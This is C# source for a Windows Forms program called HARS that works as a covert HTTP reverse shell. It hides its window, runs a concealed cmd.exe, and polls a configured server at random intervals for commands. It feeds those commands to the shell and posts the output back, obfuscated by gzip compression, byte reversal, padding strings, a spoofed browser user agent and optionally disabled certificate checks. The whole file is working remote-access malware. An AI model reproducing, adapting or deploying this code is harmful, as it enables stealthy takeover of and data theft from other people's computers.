using HARS;
using HARS.HARS;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using System.Windows.Forms;
using System.IO.Pipes;
using System.Security.Principal;
using System.IO.Compression;

namespace HARS
{
    public partial class Main : Form
    {
        // Global
        ProcessStartInfo startInfo = new ProcessStartInfo("cmd.exe");
        Process readProcess = new Process();
        String outputBuffer = "";

        void OutputHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            // Collect the sort command output.
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                outputBuffer += outLine.Data + "\n";
            }
        }

        void ErrorHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            // Collect the sort command output.
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                outputBuffer += outLine.Data + "\n";
            }
        }

        public Main()
        {
            // Init 
            InitializeComponent();
            // Check if one instance of process is already running
            if (Process.GetProcesses().Count(p => p.ProcessName == Process.GetCurrentProcess().ProcessName) > 1)
                Environment.Exit(0);
            // Set state to minimized
            this.WindowState = FormWindowState.Minimized;
            this.Opacity = 0.0;
            // Hide app from taskbar
            this.ShowInTaskbar = false;
            // Init shell process

            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardInput = true;
            startInfo.RedirectStandardError = true;
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.CreateNoWindow = true;
            startInfo.UseShellExecute = false;
            startInfo.StandardOutputEncoding = Encoding.GetEncoding(437);
            readProcess.OutputDataReceived += OutputHandler;
            readProcess.ErrorDataReceived += ErrorHandler;
            readProcess.StartInfo = startInfo;
            readProcess.Start();
            readProcess.BeginOutputReadLine();
            readProcess.BeginErrorReadLine();
        }
        

        // Hide app from task manager
        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80;
                return cp;
            }
        }
        
        private void button1_Click(object sender, EventArgs e)
        {

        }

        // Ask server for instructions
        private bool FetchCmdAndExec()
        {
            try
            {
                if (Config.AllowInsecureCertificate)
                    ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(Config.Server + ":" + Config.Port + "/" + Config.Url));
                req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                req.UserAgent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
                req.Headers.Add("Accept-Encoding","gzip, deflate, br");
                

                var buffer = default(byte[]);
                using (var memstream = new MemoryStream())
                {
                    req.GetResponse().GetResponseStream().CopyTo(memstream);
                    buffer = memstream.ToArray();
                }

                String cmd = null;
                if (buffer.Length != 0)
                {
                    Array.Reverse(buffer);
                    buffer = GZDecompress(buffer);
                    cmd = Encoding.ASCII.GetString(buffer);
                    cmd = cmd.Replace("XXPADDINGXXPADDINGXXPADDINGXX", "");
                    readProcess.StandardInput.Write(cmd);
                    readProcess.StandardInput.Flush();
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        // Reply to server with result
        private bool ReplyCmd()
        {
            String responseString;
            try
            {
                String reply = null;
                if (Config.AllowInsecureCertificate)
                    ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
                HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(Config.Server + ":" + Config.Port + "/" + Config.Url));
                req.Method = "POST";
                req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                req.UserAgent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
                req.Headers.Add("Accept-Encoding", "gzip, deflate, br");

                if (outputBuffer.Length > 0)
                {

                    reply = outputBuffer;
                    outputBuffer = "";

                    Byte[] replyByte = Encoding.ASCII.GetBytes("XXPADDINGXXPADDINGXXPADDINGXX" + reply);
                    byte[] compressedReply = GZCompress(replyByte);
                    Array.Reverse(compressedReply);
                    req.ContentLength = compressedReply.Length;
                    Stream dataStream = req.GetRequestStream();
                    dataStream.Write(compressedReply, 0, compressedReply.Length);
                    HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                    using (Stream stream = resp.GetResponseStream())
                    {
                        StreamReader reader = new StreamReader(stream, Encoding.UTF8);
                        responseString = reader.ReadToEnd();
                    }
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        private void Main_Load(object sender, EventArgs e)
        {
            while (true)
            {
                try
                {
                    // Random delay between fetchs
                    Random rnd = new Random();
                    int delay = rnd.Next(Config.MinDelay, Config.MaxDelay);
                    Thread.Sleep(TimeSpan.FromSeconds(delay));
                    FetchCmdAndExec();
                    // Or reply to server with cmd result
                    Thread.Sleep(1000);
                    ReplyCmd();
                }
                // Exit if error
                catch(Exception ex)
                {
                    Console.WriteLine(ex);
                    Environment.Exit(0);
                }
            }
        }

        private void Main_Click(object sender, EventArgs e)
        {

        }

        private void Button1_Click_1(object sender, EventArgs e)
        {

        }

        static byte[] GZCompress(byte[] data)
        {
            using (var compressedStream = new MemoryStream())
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Compress))
            {
                zipStream.Write(data, 0, data.Length);
                zipStream.Close();
                return compressedStream.ToArray();
            }
        }

        static byte[] GZDecompress(byte[] data)
        {
            using (var compressedStream = new MemoryStream(data))
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
            using (var resultStream = new MemoryStream())
            {
                zipStream.CopyTo(resultStream);
                return resultStream.ToArray();
            }
        }
    }
}
